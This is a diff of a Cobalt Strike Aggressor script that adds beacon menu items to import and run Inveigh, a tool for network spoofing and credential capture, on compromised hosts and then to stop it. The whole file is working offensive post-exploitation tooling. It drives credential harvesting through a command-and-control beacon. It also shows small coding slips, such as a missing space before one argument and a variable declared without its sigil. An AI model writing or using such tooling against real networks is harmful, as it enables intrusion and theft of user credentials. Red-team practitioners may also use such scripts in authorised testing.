@@ -2,23 +2,32 @@
 # @Und3rf10w
 
 popup beacon_bottom {
-	Menu "Inveigh"{
+	menu "Inveigh"{
 		item "Import Inveigh.ps1"{
 			local ('$bid');
 			foreach $bid ($1){
-				binput($1, "Imported Inveigh");
+				binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh.ps1"));
 				bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh.ps1"));
 			}			
 		}
-		item "Invoke-Inveigh"
+		item "Invoke-Inveigh" {
 			local('$bid');
 			foreach $bid ($1){
 				# Load and execute specifying a specific local listening/spoofing IP using default settings
 				# Prompt user to confirm that the IP address for the beacon is correct.
-				$beacon_ip = binfo($1, "internal");
-				prompt_text("What is the internal IP address of this beacon?", " $beacon_ip " {
-					bpowershell($1, 'Invoke-Inveigh -IP $beacon_ip -OutputStreamOnly Y');
+				$beacon_ip = binfo($bid, 'internal');
+				prompt_text("What is the internal IP address of this beacon?", "$beacon_ip", {
+					binput($bid, "powershell Invoke-Inveigh -IP " . $beacon_ip . "-OutputStreamOnly Y");
+					bpowershell($bid, "Invoke-Inveigh -IP " . $beacon_ip . " -OutputStreamOnly Y");
 				});
 			}
+		}
+		item "Stop-Inveigh" {
+			local('bid');
+			foreach $bid ($1) {
+				binput($bid, "powershell Stop-Inveigh");
+				bpowershell($bid, 'Stop-Inveigh');
+			}
+		}
 	}
 }
